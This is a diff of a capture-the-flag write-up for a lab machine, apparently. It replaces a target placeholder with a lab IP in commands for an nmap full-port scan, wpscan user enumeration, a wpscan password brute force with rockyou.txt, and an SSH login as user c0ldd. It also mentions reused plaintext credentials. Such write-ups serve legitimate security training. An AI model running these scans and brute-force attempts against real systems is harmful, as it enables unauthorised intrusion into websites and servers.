@@ -9,7 +9,7 @@ Linux machine running WordPress on port 80 with SSH on a non-standard port. The 
 ### Network Scanning
 
 ```bash
-nmap -sC -sV -p- <target_ip>
+nmap -sC -sV -p- 10.66.163.95
 ```
 
 Open ports:
@@ -22,7 +22,7 @@ SSH is running on port 4512 - only visible with a full port scan (`-p-`).
 ### WordPress Enumeration
 
 ```bash
-wpscan --url http://<target_ip> --enumerate u
+wpscan --url http://10.66.163.95 --enumerate u
 ```
 
 User identified: `c0ldd`
@@ -34,7 +34,7 @@ User identified: `c0ldd`
 ### WordPress Brute Force
 
 ```bash
-wpscan --url http://<target_ip> --passwords /usr/share/wordlists/rockyou.txt --username c0ldd
+wpscan --url http://10.66.163.95 --passwords /usr/share/wordlists/rockyou.txt --username c0ldd
 ```
 
 Valid credentials:
@@ -70,7 +70,7 @@ Contains plaintext database credentials that are reused as the system password f
 ### SSH as c0ldd
 
 ```bash
-ssh c0ldd@<target_ip> -p 4512
+ssh c0ldd@10.66.163.95 -p 4512
 ```
 
 User flag:
